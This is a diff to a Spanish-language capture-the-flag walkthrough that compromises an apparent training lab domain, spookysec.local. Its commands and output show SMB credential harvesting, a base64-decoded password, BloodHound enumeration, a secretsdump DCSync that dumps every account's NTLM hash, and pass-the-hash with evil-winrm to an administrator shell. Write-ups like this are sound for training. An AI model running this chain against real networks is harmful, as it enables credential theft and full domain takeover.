@@ -83,6 +83,7 @@ PING spookysec.local (10.10.165.157) 56(84) bytes of data.
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 54.135/54.135/54.135/0.000 ms
 ```
+
 Una vez hecho esto como vemos que el puerto 88 Kerberos esta abierto vamos a proceder a enumerar Usuarios
 ```
 # kerbrute userenum -d spookysec.local  passwordlist.txt  --dc spookysec.local
@@ -135,3 +136,111 @@ Nos creamos un archivo de credenciales, con las credenciales obtenidas
 ```
 svc-admin: management2005
 ```
+
+Procedemos a intentar conectarnos por SMB al recurso Backup con las credenciales Optenidas
+```
+# smbmap -u svc-admin -p management2005 -H 10.10.165.157 -d spookysec.local -r backup
+[+] IP: 10.10.165.157:445       Name: spookysec.local                                   
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        backup                                                  READ ONLY
+        .\backup\*
+        dr--r--r--                0 Sat Apr  4 21:08:39 2020    .
+        dr--r--r--                0 Sat Apr  4 21:08:39 2020    ..
+        fr--r--r--               48 Sat Apr  4 21:08:53 2020    backup_credentials.txt
+```
+
+Cuando Procedemos a descargar el archivo obtenemos un problema.
+```
+# smbmap -u svc-admin -p management2005 -H 10.10.165.157 -d spookysec.local --download backup/backup_credentials.txt
+# du -h 10.10.165.157-backup__credentials.txt                                                                                                                         
+0       10.10.165.157-backup__credentials.txt
+```
+Como vemos que no funciona correctamente procedo a montarme el recurso compartido con una montura a mi directorio /mnt
+```
+# mount -t cifs //10.10.165.157/backup /mnt/ -o username="svc-admin",password="management2005",domain=spookysec.local,rw
+# ls -la /mnt                     
+total 5
+drwxr-xr-x  2 root root    0 abr  4  2020 .
+drwxr-xr-x 20 root root 4096 may 31 21:36 ..
+-rwxr-xr-x  1 root root   48 abr  4  2020 backup_credentials.txt
+```
+Procedemos a leer el Archivo
+```
+# cat /mnt/backup_credentials.txt 
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+
+# cat /mnt/backup_credentials.txt | base64 -d
+backup@spookysec.local:backup2517860
+```
+Nos guardamos las credenciales en el archivo Creds
+Procedemos a enumerar con bloodhound.py el directorio activo
+```
+# python3 bloodhound.py -u svc-admin -p "management2005" -d spookysec.local -ns 10.10.165.157 --zip
+INFO: Found AD domain: spookysec.local
+INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Found 18 users
+INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
+INFO: Found 54 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: AttacktiveDirectory.spookysec.local
+INFO: Ignoring host AttacktiveDirectory.spookysec.local since its reported name ATTACKTIVEDIREC does not match
+INFO: Done in 00M 05S
+INFO: Compressing output into 20220615135241_bloodhound.zip
+```
+Una vez obtendio el .zip procedemos a iniciar Neo4J y bloodhound
+```
+
+
+Introducimos nuestras credenciales en Neo4J 
+Iniciamos el BloodHound desde nuestro directorio /opt/BloodHound he introducimos nuestras credenciales
+./BloodHound --no-sandbox 2>/dev/null &                                                                                                                                
+[2] 3424
+
+Cargamos nuestro .zip
+Marcamos los usuarios que tenemos comprometidos e enumeramos informacion de estos mismos
+Vemos que para el Usuario Backup pertenece al grupo de Domain Users.
+```
+
+Procedemos a intentar ejecutar la herramienta `Secretsdumps.py`
+```
+# secretsdump.py -just-dc backup:backup2517860@spookysec.local                                                                                                         
+Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation                                                                                                                                                   
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                           
+[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                               
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                                 
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::                                                                                         
+spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::                                                                         
+spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::                                                               
+spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::                                                                         
+spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::                                                                     
+spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::                                                                   
+spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::                                                                     
+spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::                                                                           
+spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::                                                                         
+spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::                                                                       
+spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::                                                                     
+spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::                                                                     
+spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::                                                                     
+spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::                                                                       
+spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                     
+ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:c1cc5e04834fdec25529f43ff910f00c:::
+```
+
+Procedemos a hacer uso de evil-winrm proporcionando el hash del usuario administrator
+```
+# evil-winrm -i 10.10.165.157 -u 'administrator' -H '0e0363213e37b94221497260b0bcb4fc'
+Evil-WinRM shell v3.3
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+thm-ad\administrator
+```
+
+Maquina Comprometida AD ~ K0H4ck
